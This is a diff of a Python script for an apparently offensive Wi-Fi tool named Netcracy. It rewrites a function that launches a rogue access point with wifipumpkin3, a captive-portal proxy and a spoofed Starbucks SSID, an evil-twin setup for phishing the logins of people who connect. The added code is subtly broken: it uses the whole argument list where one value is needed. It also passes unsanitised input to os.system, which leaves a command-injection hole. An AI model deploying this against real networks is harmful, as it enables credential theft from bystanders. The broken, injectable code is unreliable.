@@ -67,53 +67,15 @@ def enforce_monitor_mode(interface):
 # ============================================================================
 #               COMMAND ENGINE EXECUTION FUNCTIONS
 # ============================================================================
+
 def handle_rogue_ap(args):
-    target_device = args[0] if len(args) >= 1 else "wlan0"
-    chosen_template = args[1] if len(args) >= 2 else "starbucks"
-    chosen_ssid = args[2] if len(args) >= 3 else "Starbucks_WiFi"
-    
+    target_device = args if len(args) >= 1 else "wlan0"
+    chosen_template = args if len(args) >= 2 else "starbucks"
+    chosen_ssid = args if len(args) >= 3 else "Starbucks_WiFi"
     print(f"\n[+] Netcracy -> Initializing Rogue AP Subsystems...")
-    print(f"[*] Interface : {target_device}")
-    print(f"[*] Template  : {chosen_template}")
-    print(f"[*] SSID      : {chosen_ssid}\n")
-
-    xpulp_cmd = (
-        f"set interface {target_device}; "
-        f"set ssid {chosen_ssid}; "
-        f"set proxy captiveflask; "
-        f"set captiveflask.template {chosen_template}; "
-        f"start"
-    )
-    subprocess.run(["sudo", "ip", "addr", "flush", "dev", target_device], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", target_device], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    subprocess.run(["sudo", "ip", "link", "set", target_device, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-    process = subprocess.Popen(
-        ["sudo", "wifipumpkin3", "-x", xpulp_cmd],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True,
-        bufsize=1
-    )
-
-    allowed_tags = [
-        "[+]", "[*]", "[-]", "[!]", 
-        "hostapd", "dhcp", "pydhcp", "captiveflask", 
-        "pydns", "dns", "http", "post", "get", "error"
-    ]
-
-    try:
-        for line in process.stdout:
-            clean_line = line.replace("wp3 >", "").strip()
-            if any(tag in clean_line.lower() for tag in allowed_tags):
-                if "unknown plugin" not in clean_line.lower():
-                    print(clean_line)
-    except KeyboardInterrupt:
-        print("\n[*] Stopping Rogue AP subsystems...")
-        process.terminate()
-        
+    cmd = f"sudo wifipumpkin3 -i {target_device}"
+    os.system(cmd)
     
-
 def handle_wlan0mon(args):
     target_device = args[0] if len(args) >= 1 else "wlan0"
     print(f"\n[+] Netcracy -> Spawning Spectrum Interceptor on {target_device}...")
